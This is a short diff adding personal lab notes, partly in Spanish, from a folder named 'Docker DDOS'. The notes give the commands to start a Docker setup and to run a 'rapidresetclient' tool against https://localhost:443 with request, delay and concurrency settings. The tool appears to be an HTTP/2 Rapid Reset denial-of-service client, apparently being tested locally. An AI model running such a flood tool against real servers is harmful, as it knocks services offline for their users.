@@ -1,0 +1,7 @@
+cd C:\Users\Gonza\Desktop\Docker DDOS>
+
+docker-compose up --build
+
+En ubuntu vamos a///  cd rapidresetclient  ////// dentro de la carpeta home/gonza/
+
+./rapidresetclient  -requests=100  -url  https://localhost:443  -wait=100  -delay=10 -concurrency=5
